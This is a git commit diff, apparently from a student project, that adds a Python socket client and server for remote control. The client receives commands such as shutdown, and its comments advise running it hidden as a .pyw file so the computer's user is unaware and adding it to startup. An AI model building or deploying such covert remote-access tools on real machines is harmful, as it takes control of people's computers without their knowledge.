89e2382abebfc754ea6b0490b2e95f43d55679eb
ThanosTsalafoutas <a.tsalafoutas@student.tue.nl>
2022-06-15 00:19:33 +0200

    communication working

--- client.py
+++ client.py
@@ -1,15 +1,26 @@
-
 import socket
 import os
-HOST = "131.155.246.24"  # The server's hostname or IP address
-PORT = 65432  # The port used by the server
+import subprocess
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-    while True:
-        data = s.recv(1024)
-        print(data)
-        if data== b's':
-            print("Get Fucked")
-        if data== b'cmd':
-            print("open command promptS")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((socket.gethostname(), 1234))
+# this file should be run in the background so the person using the pc is not aware of the process running
+# For this to happen, use the extension.pyw,
+# which will cause the script to be executed by pythonw.exe by default.
+# This prevents the terminal window from appearing when the computer is first booted.
+# https://coduber.com/run-python-script-constantly-in-background/
+
+
+# Additionally, we also want to look at making the tool automatically boot up on start up.
+# This can be done by adding the exe on the start-up directory but not essential
+
+while (True):
+    msg = s.recv(1024)
+    decodedMsg = msg.decode("utf-8")
+    print(decodedMsg)
+    if decodedMsg == "s":
+        print('Shutting Down')
+        #send confirmation
+        s.sendall(bytes("shutting down","utf-8"))
+        # os.system("shutdown /s /t 1")
+        # The command shuts down the pc so avoid running it
--- server.py
+++ server.py
@@ -4,10 +4,17 @@ from tokenize import String
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((socket.gethostname(), 1234))
 s.listen(5)
+clientsocket, address = s.accept()
+# now our endpoint knows about the OTHER endpoint.s
+print(f"Connection from {address} has been established.")
 
+# Server sends message and waits for reply
 while True:
-    # now our endpoint knows about the OTHER endpoint.
-    clientsocket, address = s.accept()
-    print(f"Connection from {address} has been established.")
+
     msgToSend = input("Enter your message: ")
     clientsocket.send(bytes(msgToSend,"utf-8"))
+    #this does not work currently since it gets an error
+    msg = clientsocket.recv(1024)
+    decodedMsg = msg.decode("utf-8")
+    print(decodedMsg)
+
